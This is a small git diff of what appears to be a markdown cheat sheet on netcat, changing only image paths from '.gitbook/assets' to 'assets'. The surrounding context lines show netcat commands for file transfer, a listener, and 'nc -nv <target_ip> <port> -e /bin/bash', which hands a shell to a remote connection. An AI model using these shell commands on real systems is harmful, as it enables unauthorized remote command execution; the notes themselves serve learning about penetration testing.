@@ -82,7 +82,7 @@ nc -l -p <port> file_name
 nc -nv <target_ip> <port> -e /bin/bash
 ```
 
-![](.gitbook/assets/15.png)
+![](assets/15.png)
 
 * On Server Side
 
@@ -90,11 +90,11 @@ nc -nv <target_ip> <port> -e /bin/bash
 nc -nvlp <port>
 ```
 
-![](.gitbook/assets/16.png)
+![](assets/16.png)
 
 * Run os commands
 
-![](.gitbook/assets/17.png)
+![](assets/17.png)
 
 
 
